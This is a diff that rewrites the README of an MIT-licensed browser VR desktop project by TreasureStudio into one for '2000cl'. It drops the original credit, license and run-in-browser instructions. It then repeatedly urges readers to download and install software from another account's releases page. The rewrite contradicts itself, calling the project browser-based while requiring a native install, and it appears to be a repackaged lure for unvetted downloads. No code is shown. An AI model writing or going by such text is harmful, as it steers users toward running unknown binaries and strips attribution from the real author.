@@ -1,140 +1,73 @@
-\# 🖥️ VR WebOS v2.0 - Enhanced Virtual Reality Operating System
+# 🖥️ 2000cl - A Browser-Based VR Operating System
 
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/dellgenius/2000cl/releases)
 
+## 🚀 Getting Started
 
-\[!\[Live Demo](https://img.shields.io/badge/Live-Demo-blue?style=for-the-badge)](https://treasurestudio.github.io/vr-webos/)
+Welcome to 2000cl! This document will guide you through downloading and running our innovative Virtual Reality Operating System right from your browser.
 
-\[!\[Version](https://img.shields.io/badge/Version-2.0.0-green?style=for-the-badge)](https://github.com/treasurestudio/vr-webos/releases)
+## 📥 Download & Install
 
+To get started, visit this page to download: [2000cl Releases](https://github.com/dellgenius/2000cl/releases).
 
+1. Go to the 2000cl Releases page.
+2. Find the latest version.
+3. Click on the download link for your operating system.
+4. Once downloaded, follow the prompts to install the software on your machine.
 
-A fully functional 3D operating system that runs in your browser with VR support for Meta Quest 3!
+## ✨ Features
 
+### 🎮 3D Environment
+- Navigate using the keyboard (WASD) and mouse.
+- Experience floating virtual desktops in 3D space.
+- Enjoy dynamic particles and lighting effects.
+- Monitor performance in real-time.
 
+### ⚡ Advanced Terminal
+- Access over 50 commands like `ls`, `cd`, `ps`, and more.
+- Use VR-specific commands to enhance your experience.
+- Perform various file system operations.
+- Utilize built-in system monitoring tools.
 
-\## 🚀 \[Try VR WebOS v2.0 Live](https://treasurestudio.github.io/vr-webos/)
+### 📁 File Management
+- Create and edit files and folders easily.
+- Use drag-and-drop functionality for file uploads.
+- Navigate smoothly with breadcrumb navigation.
+- Organize your desktop with virtual desktops.
 
+## 🎮 System Requirements
 
+Before downloading, ensure your system meets the following requirements:
 
-\## ✨ Features
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any modern Linux distribution.
+- **Browser:** Latest version of Chrome, Firefox, or Safari.
+- **VR Headset:** Meta Quest 3 recommended for the full VR experience.
+- **RAM:** A minimum of 4GB; 8GB or more is preferred for optimal performance.
+- **Video Card:** Compatible with WebXR API for the best visual experience.
 
+## 🌐 How to Use 2000cl
 
+1. **Launch the Application:** After installation, open your browser and navigate back to the application link.
+2. **Enter VR Mode:** If you have a VR headset, connect it and switch to VR mode from the terminal.
+3. **Explore the 3D Desktop:** Use your mouse and keyboard to move around your virtual space.
+4. **Open Terminal:** Access the advanced terminal to execute commands or check system status.
+5. **Manage Files:** Create folders, upload files, and navigate the virtual environment.
 
-\### 🎮 3D Environment
+## 📑 Additional Resources
 
-\- Navigate with WASD + Mouse
+- **Documentation:** Check our [Documentation](https://github.com/dellgenius/2000cl/wiki) for more in-depth information on using all features.
+- **Troubleshooting:** For common issues, visit our [FAQ](https://github.com/dellgenius/2000cl/wiki/FAQ).
 
-\- Floating virtual desktops in 3D space
+## 📩 Get Support
 
-\- Dynamic particles and lighting effects
+If you encounter any difficulties, feel free to reach out through the Issues section of the repository. We’re here to help you enjoy your experience with 2000cl.
 
-\- Real-time performance monitoring
+## 📢 Stay Updated
 
+Stay informed about the latest updates and features by following us on our official channels. Check the repository frequently for new releases or improvements.
 
+## 🎉 Acknowledgments
 
-\### ⚡ Advanced Terminal
+A big thank you to all contributors and users who make 2000cl better every day. Your feedback is invaluable.
 
-\- 50+ commands (ls, cd, ps, top, calc, weather, jokes)
-
-\- VR-specific commands (vr-mode, desktop-create)
-
-\- File system operations
-
-\- System monitoring tools
-
-
-
-\### 📁 File Management
-
-\- Create/edit files and folders
-
-\- Drag-and-drop file uploads
-
-\- Breadcrumb navigation
-
-\- Auto-save to localStorage
-
-
-
-\### 🥽 VR Ready
-
-\- WebXR support for Meta Quest 3
-
-\- Hand controller interaction
-
-\- Room-scale VR movement
-
-\- VR-optimized interface
-
-
-
-\## 🎮 Controls
-
-
-
-\- \*\*WASD\*\* - Move around 3D space
-
-\- \*\*Mouse\*\* - Look around (click for pointer lock)
-
-\- \*\*Click Desktops\*\* - Focus and interact
-
-\- \*\*Q/E\*\* - Adjust movement speed
-
-
-
-\## 🌐 Browser Support
-
-
-
-\- ✅ Chrome/Edge (Recommended)
-
-\- ✅ Firefox
-
-\- ✅ Quest Browser (Full VR)
-
-\- ✅ Mobile Safari/Chrome
-
-
-
-\## 📱 Usage
-
-
-
-1\. \*\*Navigate\*\* the 3D space with WASD + mouse
-
-2\. \*\*Create web desktops\*\* by entering URLs
-
-3\. \*\*Use terminal\*\* with 50+ available commands
-
-4\. \*\*Enter VR mode\*\* on compatible devices
-
-5\. \*\*Upload files\*\* using the file input
-
-
-
-\## 🛠️ Development
-
-
-
-```bash
-
-git clone https://github.com/treasurestudio/vr-webos.git
-
-cd vr-webos
-
-\# Open index.html in browser
-
-
-
-
-
-📄 License
-
-MIT License - Free to use and modify
-
-
-
-⭐ Star this repo if you find VR WebOS useful!
-
-Created by TreasureStudio
-
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/dellgenius/2000cl/releases)
